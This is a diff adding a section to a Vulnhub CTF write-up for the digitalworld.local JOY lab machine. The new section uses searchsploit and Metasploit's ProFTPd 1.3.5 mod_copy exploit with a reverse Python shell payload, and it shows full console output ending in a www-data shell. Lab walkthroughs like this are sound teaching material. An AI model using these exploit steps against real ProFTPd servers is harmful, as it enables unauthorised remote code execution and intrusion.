@@ -3,7 +3,7 @@ title: Vulnhub - digitalworld.local JOY
 description: My writeup on digitalworld.local JOY box.
 categories:
  - vulnhub
-tags: vulnhub udp snmp nse tftp
+tags: vulnhub udp snmp nse tftp ProFTPd searchsploit metasploit
 ---
 
 ![](https://i.imgur.com/h3KUnSs.png)
@@ -286,3 +286,87 @@ Note that we have some other configurations in this machine.
 
 ## Shell as www-data
 
+`ProFTPd` version seems vulnerable, let's fire up `searchsploit` to search for possible exploits:
+
+```
+$ searchsploit ProFTPd 1.3.5
+------------------------------------------------------------------------------------------
+ Exploit Title                                                 |  Path
+------------------------------------------------------------------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)      | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution            | linux/remote/36803.py
+ProFTPd 1.3.5 - File Copy                                      | linux/remote/36742.txt
+------------------------------------------------------------------------------------------ 
+```
+
+Perfect we can have RCE! Let's fire up metasploit.
+
+```
+$ service postgresql start; msfconsole
+ 
+msf5 > search name:proftpd type:exploit
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank       Check  Description
+   -  ----                                    ---------------  ----       -----  -----------
+   0  exploit/freebsd/ftp/proftp_telnet_iac   2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
+   1  exploit/linux/ftp/proftp_sreplace       2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   2  exploit/linux/ftp/proftp_telnet_iac     2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
+   3  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
+   4  exploit/unix/ftp/proftpd_modcopy_exec   2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
+
+msf5 > use exploit/unix/ftp/proftpd_modcopy_exec
+```
+
+Now for the settings, we need a writable path that's the `/var/www/tryingharderisjoy` we found before.
+
+```
+msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 192.168.1.19
+RHOSTS => 192.168.1.19
+msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/tryingharderisjoy
+SITEPATH => /var/www/tryingharderisjoy
+```
+
+Now a really important thing is the payload option, most people forget to add it & exploit fail.
+
+```
+msf5 exploit(unix/ftp/proftpd_modcopy_exec) > show payloads
+Compatible Payloads
+===================
+
+   #  Name                         Disclosure Date  Rank    Check  Description
+   -  ----                         ---------------  ----    -----  -----------
+   0  cmd/unix/bind_awk                             manual  No     Unix Command Shell, Bind TCP (via AWK)
+   1  cmd/unix/bind_perl                            manual  No     Unix Command Shell, Bind TCP (via Perl)
+   2  cmd/unix/bind_perl_ipv6                       manual  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   3  cmd/unix/generic                              manual  No     Unix Command, Generic Command Execution
+   4  cmd/unix/reverse_awk                          manual  No     Unix Command Shell, Reverse TCP (via AWK)
+   5  cmd/unix/reverse_perl                         manual  No     Unix Command Shell, Reverse TCP (via Perl)
+   6  cmd/unix/reverse_perl_ssl                     manual  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   7  cmd/unix/reverse_python                       manual  No     Unix Command Shell, Reverse TCP (via Python)
+   8  cmd/unix/reverse_python_ssl                   manual  No     Unix Command Shell, Reverse TCP SSL (via python)
+
+msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set payload cmd/unix/reverse_python
+payload => cmd/unix/reverse_python
+msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST eth0
+LHOST => eth0
+```
+
+Let's fire it up!
+
+```
+msf5 exploit(unix/ftp/proftpd_modcopy_exec) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.14:4444 
+[*] 192.168.1.19:80 - 192.168.1.19:21 - Connected to FTP server
+[*] 192.168.1.19:80 - 192.168.1.19:21 - Sending copy commands to FTP server
+[*] 192.168.1.19:80 - Executing PHP payload /k0FQx7m.php
+[*] Command shell session 1 opened (192.168.1.14:4444 -> 192.168.1.19:44038) at 2020-10-10 00:26:26 +0300
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@JOY:/var/www/tryingharderisjoy$ whoami;id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
+```
